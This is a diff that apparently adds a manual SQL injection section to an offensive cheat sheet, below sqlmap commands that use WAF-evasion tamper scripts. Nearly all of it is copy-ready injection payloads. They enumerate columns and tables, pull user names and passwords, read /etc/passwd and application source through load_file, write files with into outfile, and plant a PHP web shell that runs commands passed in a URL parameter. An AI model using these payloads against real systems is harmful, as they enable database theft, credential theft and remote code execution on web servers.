@@ -107,3 +107,54 @@ sqlmap -u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equalto
 ```
 sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
 ```
+
+
+# SQLI Manually
+
+## SQLI Manually - Dump the content of table into the filesystem
+```
+')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
+```
+
+## SQLI Manually - find the number of columns
+```
+order by 9 -- -
+```
+
+## SQLI Manually - Find space to output db
+```
+union select 1,2,3,4,5,6,7,8,9 -- -
+```
+
+## SQLI Manually - Get all tables
+```
+union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables -- -
+```
+
+## SQLI Manually - Get all columns from a specific table
+```
+union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' -- -
+```
+
+## SQLI Manually - Get content from the users-table. From columns name and password
+```
+union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users
+```
+
+## SQLI Manually - read file
+```
+union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 -- -
+union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 -- -
+```
+
+## SQLI Manually - create a file and call it to check if really created
+```
+union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' -- -
+union select 1,2,3,4, load_file('/var/www/test') ,6,7,8,9 -- -
+```
+
+## SQLI Manually - create a file to get a shell
+```
+union select null,null,null,null,'<?php system($_GET[‘cmd’]) ?>' ,6,7,8,9 into outfile '/var/www/shell.php' -- -
+union select null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -
+```
